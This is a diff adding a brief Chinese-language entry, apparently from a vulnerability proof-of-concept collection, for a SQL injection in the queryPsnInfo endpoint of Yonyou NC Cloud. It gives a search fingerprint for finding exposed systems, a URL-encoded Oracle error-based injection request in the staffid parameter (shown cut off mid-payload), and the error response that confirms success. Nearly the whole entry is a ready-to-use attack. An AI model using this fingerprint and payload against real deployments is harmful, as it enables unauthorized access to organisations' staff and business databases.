@@ -1,0 +1,6 @@
+# 用友NCCloudqueryPsnInfo最新SQL注入漏洞
+
+用友 ｜ SQL注入 ｜ —
+- **指纹**：`app="用友-NC-Cloud"`
+- **请求**：`GET /ncchr/pm/obj/queryPsnInfo?staffid=1%27+AND+1754%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%2`
+- **响应特征**：400 SYS.UTL_INADDR
